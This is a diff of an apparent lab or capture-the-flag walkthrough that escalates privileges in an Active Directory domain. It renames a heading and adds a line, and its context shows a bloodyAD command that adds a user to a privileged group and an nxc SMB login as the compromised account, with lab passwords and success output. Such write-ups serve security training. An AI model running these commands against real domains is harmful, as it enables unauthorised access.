@@ -602,7 +602,7 @@ Looks like i have AddSelf on a group called `adminaccs`
 
 And this group has GenericAll on the `shareadmin`
 
-# Adding `d.goggins` to `adminaccs` group and compromising `shared`
+# Adding `d.goggins` to `adminaccs` group and compromising `sharedadmin`
 
 ```python
 bloodyAD --host dc01.fragments.local -d fragments.local -u d.goggins -p 'HiO5n449W36!' add groupMember 'adminaccs' 'd.goggins' 
@@ -628,6 +628,8 @@ nxc smb dc01.fragments.local -u sharedadmin -p 'Password123!' --smb-timeout 5 -k
 SMB         dc01.fragments.local 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         dc01.fragments.local 445    DC01             [+] fragments.local\sharedadmin:Password123!
 ```
+
+This user is now compromised!
 
 
 
